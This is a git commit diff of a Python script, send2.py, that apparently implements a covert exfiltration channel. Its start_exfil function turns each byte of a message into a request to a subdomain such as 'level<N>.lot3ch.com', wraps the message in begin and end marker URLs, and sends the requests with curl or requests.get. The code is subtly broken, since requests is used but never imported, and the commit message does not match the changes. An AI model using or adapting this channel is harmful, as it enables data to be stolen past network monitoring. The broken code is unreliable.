de5286fcee23ef205250ea45fbf16520a8c78186
victorsch <victor.c.schiavo@gmail.com>
2022-02-11 21:17:50 -0800

    Removed old send script

--- send2.py
+++ send2.py
@@ -3,6 +3,8 @@ from random import randrange
 import struct
 import os
 import subprocess
+from time import sleep
+import argparse
 
 
 def encode(message):
@@ -13,13 +15,22 @@ def start_exfil(binary_data):
     urls = []
     for c in binary_data:
         num_value = str(c)
-        urls.append("http://level" + str(num_value) + ".lotech.com")
+        urls.append("http://level" + str(num_value) + ".lot3ch.com")
     return(urls)
 
 
 if __name__ == '__main__':
     cipher = encode("poopy butt")
-    urls = start_exfil(cipher)
-    
+    urls = []
+    urls.append("http://level216.lot3ch.com") # Begin message
+    urls_add = start_exfil(cipher)
+    for url in urls_add:
+        urls.append(url)
+    urls.append("http://level218.lot3ch.com") # End message
     for url in urls:
-        os.system("curl " + url)
+        print(url)
+        headers = { 'Referer': url[7:] }
+        print(headers)
+        response = requests.get(url, headers=headers)
+        #sleep(1)
+
